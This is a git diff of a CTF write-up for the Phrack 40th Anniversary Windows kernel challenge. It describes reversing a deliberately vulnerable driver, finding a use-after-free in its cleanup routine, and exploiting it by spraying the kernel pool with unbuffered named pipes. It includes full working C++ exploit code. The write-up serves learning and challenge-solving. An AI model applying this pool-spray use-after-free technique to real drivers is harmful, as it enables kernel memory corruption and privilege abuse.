@@ -1,218 +1,360 @@
 # Phrack 40th Anniversary CTF Challenge Solution
+* https://github.com/xforcered/PhrackCTF/tree/master
+
+# Initial Looks
+After opening the driver in binary ninja, i immediately noticed the driver entry allocates a [ListEntry type structure](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry) and stores it in the [DeviceExtension](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-extensions) field of the DeviceObject. Driver extensions allow developers to store the 'state' of the driver throughout its lifetime. 
+
+<img width="809" height="304" alt="image" src="https://github.com/user-attachments/assets/f23c9146-3ec9-4181-9e91-b51570853b22" />
+
+Also the driver only has a few IOCTLS, the most interesting being the dispatch cleanup and the main ioctl handler.
+
+<img width="520" height="55" alt="image" src="https://github.com/user-attachments/assets/00a7a662-279e-4a8a-8520-960c2c070681" />
+
+# Ioctls
+Taking a look at the ioctl handler its what you would expect a simple switch case with each handler.
+<img width="591" height="921" alt="image" src="https://github.com/user-attachments/assets/b9cc679c-95f9-4b93-bab8-a49ceceefeb1" />
+
+Peeking at the first one shows that this function takes the user supplied buffer and creates a NODE of some structure type consisting of metadata such as the pid of the calling process.
+Then appends the userdata (our buffer) to that struct and adds that as a node to the linked list the linked list being the global driver state
+
+<img width="1363" height="803" alt="image" src="https://github.com/user-attachments/assets/98d1a25e-7540-4de0-a6d7-05a8fce33d7a" />
+
+<img width="744" height="503" alt="image" src="https://github.com/user-attachments/assets/22a5ac44-5deb-4373-b937-e09d32f6d9c2" />
+
+The driver state can now be thought of like this a doubly linked list with some metadata plus the user buffer
+```
+void* flink
+void* blink
+struct metadata
+void* userbuffer
+```
+```
+[HEAD] -> [NODE1] -> [NODE2] -> [HEAD]
+```
+The rest of the ioctls are quite interesting there is a function that allows you to read the flag into a global kernel buffer that is allocated in the driver entry function 
+One that allocates an MDL for a user buffer, allowing us to specify an address in our own userland process space that gets mapped into kernel memory. 
 
 
-# Spoilers Below
 
-# Intro
+Read Flag 
 
-# Using Binary ninja
-
-# Noticing odd things
-IOCTLS (read file, gFileBuffer etc)
-Driver Extension etc.
-Structure of linked list etc
-Notice that theres a check that allows us to read the file. into our bufffer.
-
-# UAF
-confirmed the UAF
-
-# exploiting by spraying
-spray
-read file
-
-# got flag, thoughts on kaslr windows 11 etc.
------ preliminary notes start -----
-# first thing i did
-
-I decided to use binary ninja to reverse the driver,
-because ive had good results with it in the past.
-
-i immediately took a look at the driver entry point and immediately
-notices a couple things. 
-
-it allocates a buffer to a global variable from the non paged pool
-(screenshot of the global variable here)
-
-the device object accesses the driver extension offset and seems to initialize a LIST_ENTRY type
-
-further investigating the driver extension via documentation 
-it seems to be used to hold driver state throughout the lifetime of the driver
-
-i kept this in mind while reviewing the ioctls 
-pivoting to the IOCTLS one by one they started to paint a picture
-
-the first one in the switch statement takes a user provided length
-and allocates a structure from the non paged pool and initializes some
-variables then it appends it to the LIST_ENTRY variable taken from the driver extension pointer
-(screenshot here)
-
-at this point its safe to say the driverextension is the LIST HEAD
-and contains LIST_ENTRYS to the processes that connect to it
-
-basically
-
-HEAD -> PID1 -> PID2 -> PID3
-
-the driver allocates a node in the list per PROCESS ID and sets some values
-
-using binary ninja i created a struct that looked like this and it seemed to make sense
+<img width="1041" height="595" alt="image" src="https://github.com/user-attachments/assets/e24c10e5-3831-4c44-8cd2-897aa2f0105d" />
 
 
-struct DeviceExtensionHdr __packed
+Allocate MDL
+
+<img width="979" height="568" alt="image" src="https://github.com/user-attachments/assets/16fac13c-735c-414a-8a85-830df7bf2eb8" />
+
+
+
+As well as three others, one that reads from the kernel buffer into the mapped user buffer 
+one that writes from our user buffer to the kernel buffer and one that frees the MDL.
+
+
+User To Kernel Copy
+
+<img width="700" height="500" alt="image" src="https://github.com/user-attachments/assets/06240a3b-2c13-40d8-be07-0144977c680f" />
+
+
+Kernel To User Copy
+
+<img width="644" height="453" alt="image" src="https://github.com/user-attachments/assets/d0d4015e-7e67-4e26-815e-c8adbcc1a8a7" />
+
+Free Mdl
+
+<img width="619" height="497" alt="image" src="https://github.com/user-attachments/assets/7b36a1cb-60d2-4a94-8e8b-4c0c02e98908" />
+
+
+
+After spending a couple days reversing i was able to come up with this structure for the user's node that is stored.
+```
 {
-    LIST_ENTRY entry;
-    UINT64 pid;
-    UINT64 zeroIfFree;
-    MDL* MdlBuffer;
-    UINT64 MappedPagesAddr;
-    UINT64 length;
-    UINT64 UserBuffer;
-};
+LIST_ENTRY* entry
+UINT64 PID
+UINT64 IsFreed
+MDL* Mdl
+UINT64 MappedPhysicalPages
+UINT64 LengthOfUserData
+VOID* UserData
+}
+```
+It all added up but i was not able to actually exploit this functionality in any way. I was able to map a user buffer and copy data to the kernel buffer but i didnt really have full control over what was going on. So i took a step back and decided to look at the cleanup function.
 
-the most important variables are pid, zeroifFree,MdlBuffer,and MappedPagesAddr (all names i made up btw)
-(was able to deduce this after looking through all the ioctls including the next one)
+# Use After Free
 
-this next ioctl checks to see if the calling process has an MDL associated with it. if not it will allocate one controlled by the user and map the pages into kernel space.
-(screenshot)
-1400011c4            else if (*(uint32_t*)(*(uint64_t*)((char*)Irp->Tail + 0x40) + 0x10) >= 0x10)
-1400011db            {
-1400011ff                MDL* UserControlledMdl;
-1400011ff                UserControlledMdl = IoAllocateMdl(*(uint64_t*)Irp->AssociatedIrp, 0x1000, 0, 0, nullptr);
-1400011ff                
-14000120b                if (UserControlledMdl)
-14000120b                {
-140001214                    MDL* MdlBuffer = StoredBuffer->MdlBuffer;
-140001214                    
-14000121b                    if (MdlBuffer)
-14000121b                    {
-14000121d                        MmUnlockPages(MdlBuffer);
-140001227                        IoFreeMdl(StoredBuffer->MdlBuffer);
-14000121b                    }
-14000121b                    
-140001234                    KPROCESSORMODE = 1;
-140001239                    MmProbeAndLockPages(UserControlledMdl, KPROCESSORMODE, IoModifyAccess);
-14000123f                    StoredBuffer->MdlBuffer = UserControlledMdl;
-14000125b                    UINT64 MappedPagesAddress;
-14000125b                    MappedPagesAddress = MmMapLockedPagesSpecifyCache(UserControlledMdl, 0, MmNonCached, nullptr, 0, 0x10);
-140001261                    StoredBuffer->MappedPagesAddr = MappedPagesAddress;
+Taking a look at the cleanup function shows the driver checking if the calling process matches the pid in the linkedlist then attempts to free the MDL if still valid. Then performs a check that removes the node from the linked list. After it frees the pool allocation for the whole node but there is a bug in the check. If the user buffer contains 0x70 then the node will not be removed. But will still be freed giving us a UAF bug.
 
 
-at this point i thought the vulnerability was in the way the MmProbeAndLockPages is called but it correctly sets the processor mode to 1 which does not allow us to pass kernel mode addresses. 
-still we can pass a userland addres and it is mapped into kernel space which is interesting
+<img width="707" height="942" alt="image" src="https://github.com/user-attachments/assets/16c181a1-8b51-414f-9e00-9a5cf3b2d79e" />
 
 
-there were two more ioctls one that reads data from the global kernel address noticed in the driver entry function and writes it to the kernel address that is mapped from our userland address. and one that does the opposite it writes from our user address to the kernel buffer.
-
-the last ioctl worth mentioning is really important. 
-it performs a check on the calling processes driver extension node entry
-and if a value is set. it will read the flag into the target mapped address in our struct.
-
-the only issue is the check is out of our control (for now)
+# Exploitation Thought Process
+The current process i was thinking of the perform the exploit was the following.
 
 
-else if (*(uint8_t*)((char*)StoredBuffer->zeroIfFree)[1])
+0. We connect to the driver and allocate a node of size 0xC0.
 
-the flag only gets set to 1 once we allocate our buffer,
-and 0 once a different ioctl is called to free it. but the check
-checks if the byte after is set so our value needs to be greater than
-0xFF
+```
+[HEAD] -> [PID1] -> [HEAD]
+```
+1. We can close the handle to the driver triggering the cleanup.
+```
+[HEAD] -> [FREE] -> [HEAD]
+```
+2. Then we can spray the heap so something we control gets put there.
 
-around this time my mental model for the problem was.
-
-we need to pass this check to read the flag.
-but there is no way for us to control the flag value directly.
-but perhaps there is a way for us to control INDIRECTLY
-
-after going back to the driver entry i noticed this 
-
-14000106a        DriverObject->MajorFunction[0x12] = FreesListEntryOnDeviceCloseCouldHaveUAF;
-
-it looked like a function that is called when closing the handle to the driver
-to perform cleanup.
-upon further inspection thats exactly what it does
-(screenshot)
-
-but there is a check that allows the node to not be removed from the linked list but still freed 
-
-    if (!Next->zeroIfFree || !Next->length || *(uint8_t*)((char*)Next->length)[4] != 0x70)
-
-at first glance it looks like all we need to do is pass 0x70 to our buffer that is appened to the struct metadata from above since length is always set and zeroiffree can be set to 1
-
-after changing my payload to be 0x70 it indeed passed the check and the buffer is freed but we can still reopen the handle to the driver after closing it.
-
-giving us a UAF vulnerability. 
-
-the next steps were to find out how to spray the heap and set it up so that when we freed our node it can be replaced with something we control.
-
-(perhaps explanation of heap spraying here)
-
-[X] [X] [OUR NODE] [X]
-[X] [X] [] [X]
-[X] [X] [SOMETHING WE CONTROL NOW] [X]
-
-after googling i found many articles using named pipe).
-(list articles here)
-
-this method is extremely effective because it allows you to set the size of the allocation arbitrarily.
-which is needed when spraying as the objects need to be the same or similar sizes so the heap reuses the location of the originally freed object.
-
-but they all included DATA_ENTRY metadata for the first 0x48 bytes.
-and did not allow us to fully control the PID variable in the struct
-which we needed to match our original calling process that freed the node
-
-since we control the size of the payload we send, we can have it match our pipe buffer extremely easily after some tweaks.
-
-i was able to consistently get the sprayd objects to be in the location of our freed node.
-
-but i could not reuse the new object because of the aformentioned metadata
-after looking for different kernel objects that i could use they all ran into the same issue. Until i found this article
-(mention article that uses unbuffered pipe)
-
-that uses the same pipe technique but allows you to set it to be unbuffered
-which gives full control over the data and has no headers.
-
-after looking at the POC it seemed pretty simple and similar to the original approach.
-
-sprayed again then we can see that the buffer is fully controlled by us.
-(image here maybe)
+```
+[HEAD] -> [Something we control] -> [HEAD]
+```
+3. Abuse the UAF to bypass the checks we need.
 
 
-now when we spray we can properly set the values to things we control
-the pid, the flag to bypass the check to actually read the flag etc.
-
-after doing this we actually bypass the flag check!
-(screenshot?)
-
-the next step was to include an address in our address space that the kernel can write the flag to and call the IOCTL to write it to that address
-
-(screenshot of the flag redacted)!
+Ideally we would be able to fake object the driver expects and keep the same pid so the driver knows its our node. As well as setting the IsFreed variable to be a value that bypasses this check 
 
 
-this worked perfectly and the only thing left to do was to fill the holes
-so that when we close the handle again our node is not freed again which can crash the system. so i choose to set the flink and blink members of the fake object to point to a buffer we control in user land that effectively points to NULL signaling the end of the linkedlist and does not free the node.
+<img width="533" height="39" alt="image" src="https://github.com/user-attachments/assets/87da5bb7-3070-4307-a579-54b8e860480a" />
 
-here is the full exploit code.
+This would allow us to read the file into the global kernel buffer. From there we should be able to read that kernel buffer into an address we control using the read ioctl.
+
+<img width="666" height="473" alt="image" src="https://github.com/user-attachments/assets/4dd9dc42-0e2f-432e-805c-82dfa65a5f46" />
+
+Below are the values we need to control
+
+```
+{
+LIST_ENTRY* entry
+UINT64 PID <- we need to keep it the same
+UINT64 IsFreed <- we need to set it to a value that passes the check
+MDL* Mdl
+UINT64 MappedPhysicalPages <- we need to set it to an address that we control to see the output of the flag.
+UINT64 LengthOfUserData
+VOID* UserData
+}
+```
+
+# Heap Spray
+Having never performed a kernel heap exploit, i naturally scoured google for information on the topic and found alot of research done on the subject. But they all seemed to reference work by [Alex Ionescu](www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/) where he uses named pipes to spray the heap. This approach works great because you can control the size of the allocation of the objects. But the problem is it adds a header to the allocation.
+
+The first 0x48 bytes consist of the following header data [Courtesy of Wetw0rk](https://wetw0rk.github.io/posts/0x03-approaching-the-modern-windows-kernel-heap/)
+```
+{
+    LIST_ENTRY QueueEntry;
+    ULONG DataEntryType;
+    PIRP Irp;
+    ULONG QuotaInEntry;
+    PSECURITY_CLIENT_CONTEXT ClientSecurityContext;
+    ULONG DataSize;
+} NP_DATA_QUEUE_ENTRY, *PNP_DATA_QUEUE_ENTRY;
+
+```
+
+Which doesnt work because we need the DataEntryType to be our PID.  So i continued my search attempting to find a spray that fully controls the data. Eventually i found [this article](https://medium.com/reverence-cyber/cve-2023-36802-mssksrv-sys-local-privilege-escalation-reverence-cyber-d54316eaf118) where robel campbell uses a similar technique leveraging named pipes but by setting them to be unbuffered named pipes you fully control the data and the size of the allocation. He also included code showing exactly how to perform the spray. Please check that article for the full writeup on the technique.
+
+# Exploit
+
+After some trial and error debugging using !pool and !poolused i got the size of the allocations to match up perfectly. I was able to get my kernel object to be replaced by data we have full control over.
+Then i set the correct pid value as well as the address to point to a buffer we allocate. Below we can see the spot being taken by our fake object.
+
+Original allocation before being freed.
+
+<img width="618" height="461" alt="image" src="https://github.com/user-attachments/assets/d83028c7-0c96-442c-9365-0dc1fe217f0c" />
+
+The state of the pool after our heap spray fills the empty spot with our fake object.
+
+<img width="830" height="466" alt="image" src="https://github.com/user-attachments/assets/a5b3af24-74db-4737-97f2-2abc12496464" />
+
+Our fake object with correct variables to bypass checks and exfiltrate the flag.
+
+<img width="511" height="182" alt="image" src="https://github.com/user-attachments/assets/092503a1-196b-4054-a15b-554564200371" />
 
 
-# thoughts
-first time exploiting kernel heap, really fun,
-couldnt have done it with all the previous articles and research out there
+Below is the full exploit code with comments
+```cpp
+#include <stdio.h>
+#include <Windows.h>
+#include <assert.h>
 
-was thinking perhaps its possible to get RCE? my virtual machine is running
-windows 11 and KASLR bypasses seem to be killed off. the only one i found is the prefetch attack (link here)
+typedef struct _IO_STATUS_BLOCK {
+    union {
+        NTSTATUS Status;
+        PVOID    Pointer;
+    };
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
 
-that could be research for another time.
+typedef NTSTATUS (*NtFsControlFile)(
+    IN HANDLE               FileHandle,
+    IN HANDLE               Event OPTIONAL,
+    IN VOID* ApcRoutine OPTIONAL,
+    IN PVOID                ApcContext OPTIONAL,
+    OUT PIO_STATUS_BLOCK    IoStatusBlock,
+    IN ULONG                FsControlCode,
+    IN PVOID                InputBuffer OPTIONAL,
+    IN ULONG                InputBufferLength,
+    OUT PVOID               OutputBuffer OPTIONAL,
+    IN ULONG                OutputBufferLength);
 
 
+VOID AllocateKernelObject(HANDLE hDriver) {
+    UINT8 buffer[512] = { 0 };
+    memset(buffer, 0x70, 512); // <- so the driver doesnt remove it from the linkedlist creating a UAF
+    DWORD* bufferLength = (DWORD*)((buffer)+8);
+    DWORD targetLength = 0x78; // 0x68+0x38 = 160 decimal were getting B0
+    *bufferLength = targetLength;
+    BOOL result = DeviceIoControl(hDriver, 0x80002000, &buffer, 512, NULL, 0, NULL, NULL);
+    if (result) {
+    }
+    else {
+        printf("[-] Failed To Allocate Kernel Object \n");
+        exit(0);
+    }
+}
+
+// shout to https://medium.com/reverence-cyber/cve-2023-36802-mssksrv-sys-local-privilege-escalation-reverence-cyber-d54316eaf118
+// https://github.com/x0rb3l/CVE-2023-36802-MSKSSRV-LPE/tree/main
+// for the unbuffered pipe example below
+#define FSCTL_CODE 0x119ff8
+#define SPRAY_SIZE 0x10000
+#define PIPESPRAY_SIZE 0xC0
+#define PAYLOAD_SIZE 0xC0
+
+HANDLE phPipeHandleArray[sizeof(HANDLE) * SPRAY_SIZE];
+HANDLE phFileArray[sizeof(HANDLE) * SPRAY_SIZE];
 
 
+// Used to free the kernel objects
+void CreateHoles() {
+    for (int i = 0; i < SPRAY_SIZE; i += 4)
+    {
+        CloseHandle(phPipeHandleArray[i]);
+        CloseHandle(phFileArray[i]);
+    }
+}
 
+VOID UnbufferedHeapSpray(void* data,int size) {
+    IO_STATUS_BLOCK isb;
+    OVERLAPPED ol;
+    NtFsControlFile _NtfsControlFile  = (NtFsControlFile)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
+    if (_NtfsControlFile == NULL) {
+        printf("[-] Failed to get function\n");
+        return;
+    }
 
+    for (int i = 0; i < SPRAY_SIZE; i++) {
+        phPipeHandleArray[i] = CreateNamedPipe(L"\\\\.\\pipe\\exploit", PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, size, size, 0, 0);
 
+        if (phPipeHandleArray[i] == INVALID_HANDLE_VALUE) {
+            printf("[!] Error while creating the named pipe: %d\n", GetLastError());
+            exit(1);
+        }
 
+        memset(&ol, 0, sizeof(ol));
+        ol.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+        if (!ol.hEvent) {
+            printf("[!] Error creating event: %d\n", GetLastError());
+            exit(1);
+        }
+
+        phFileArray[i] = CreateFile(L"\\\\.\\pipe\\exploit", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
+
+        if (phFileArray[i] == INVALID_HANDLE_VALUE) {
+            printf("[!] Error while opening the named pipe: %d\n", GetLastError());
+            exit(1);
+        }
+
+        NTSTATUS ret = _NtfsControlFile(phPipeHandleArray[i], 0, 0, 0, &isb, FSCTL_CODE, data, size, NULL, 0);
+
+        if (ret == STATUS_PENDING) {
+            DWORD bytesTransferred;
+            if (!GetOverlappedResult(phFileArray[i], &ol, &bytesTransferred, TRUE)) {
+                printf("[!] Overlapped operation failed: %d\n", GetLastError());
+                exit(1);
+            }
+        }
+        else if (ret != 0) {
+            printf("[!] Error while calling NtFsControlFile: %p\n", ret);
+            exit(1);
+        }
+        CloseHandle(ol.hEvent);
+    }
+}
+
+typedef struct payload_t {
+    LIST_ENTRY64 Entry;
+    UINT64 Pid;
+    UINT64 ZeroIfFree;
+    UINT64 * MdlAddress;
+    UINT64 MappedPagesAddress;
+    UINT64 Length;
+} PAYLOAD;
+
+int main()
+{
+    printf("[+] Allocating Object\n");
+    HANDLE hDriver = CreateFile(L"\\\\.\\VeryNormalDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDriver == INVALID_HANDLE_VALUE) {
+        return -1;
+    }
+    AllocateKernelObject(hDriver);
+    printf("[+] Freeing Object\n");
+    CloseHandle(hDriver);
+    void* data = VirtualAlloc(NULL, 0xB0, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    void* data2 = VirtualAlloc(NULL, 0xB0, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    memset(data, 0x41, 0xB0);
+    memset(data2, 0x0, 0xB0);
+    PAYLOAD p = {0}; //
+    p.Pid = GetCurrentProcessId(); // <------------------------------------------------------ used so the driver associates with our same process.
+    p.ZeroIfFree = 0xFFFFFFFF; // <---------------------------------------------------------- used to bypass the read file check
+    VOID* OurBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    memset(OurBuffer, 0x0, 0x1000);
+    p.MappedPagesAddress = (UINT64)OurBuffer; // <------------------------------------------- buffer in usermode that kernel will write flag to
+    *(PAYLOAD*)data = p;
+    UnbufferedHeapSpray(data, 0xB0); // <---------------------------------------------------- spray Heap so it fills our hole
+    printf("[+] Spraying heap!\n");
+    printf("[+] Attempting to exploit the UAF now\n");
+    hDriver = CreateFile(L"\\\\.\\VeryNormalDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDriver == INVALID_HANDLE_VALUE) {
+        printf("failed to open driver %u\n", GetLastError());
+        return -1;
+    }
+    printf("[+] Attempting to read file\n");
+	DeviceIoControl(hDriver, 0x80002014, NULL, 0x0, NULL, 0, NULL, NULL);
+    printf("[+] Attempting to copy file to our buffer\n");
+	DeviceIoControl(hDriver, 0x80002010, NULL, 0x0, NULL, 0, NULL, NULL);
+
+    printf("[+] Flag %s\n", (char*)p.MappedPagesAddress);
+    memset(&p, 0x0, sizeof(PAYLOAD));
+    PAYLOAD p2 = { 0 };
+    p.Pid = -1;
+    p2.Entry.Flink = (UINT64)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    p2.Entry.Blink = (UINT64)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    memset((VOID*)p2.Entry.Flink, 0x0, 0x1000);
+    memset((VOID*)p2.Entry.Blink, 0x0, 0x1000);
+    *(PAYLOAD*)data2 = p2;
+    CreateHoles();
+	printf("[+] Refilling holes!\n");
+    // refill the holes so we dont crash the machine
+    UnbufferedHeapSpray(data2, 0xB0);
+	printf("[+] Hopefully we dont crash!\n");
+	printf("[+] Done!\n");
+
+    return 0;
+}
+
+```
+
+After running our exploit we were able to capture the flag.
+<img width="724" height="373" alt="image" src="https://github.com/user-attachments/assets/b7dc91a5-f854-4bfb-b853-20a45f6dc641" />
+
+This was ran on the following version of windows. Beware the exploit crashes the machine sometimes.
+<img width="533" height="69" alt="image" src="https://github.com/user-attachments/assets/462fc9de-0aee-411e-a0a9-330faba589fe" />
+
+# Conclusion
+Big thanks to [@chompie1337](https://github.com/chompie1337) for this challenge, as it was a great way to spend a couple days getting my feet wet
+with windows kernel heap exploitation. Also many thanks to all the research listed below as it was instrumental in finishing this challenge.
 
 # References
-* https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation&ved=2ahUKEwjEoKOV67-PAxVPSjABHeJsJEcQFnoECBcQAQ&usg=AOvVaw2WpS4aLLeq9QtCeg4NUAc-
+* https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation&ved=2ahUKEwjEoKOV67-PAxVPSjABHeJsJEcQFnoECBcQAQ&usg=AOvVaw2WpS4aLLeq9QtCeg4NUAc-
 * https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/
 * https://wetw0rk.github.io/posts/0x03-approaching-the-modern-windows-kernel-heap/
 * www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/
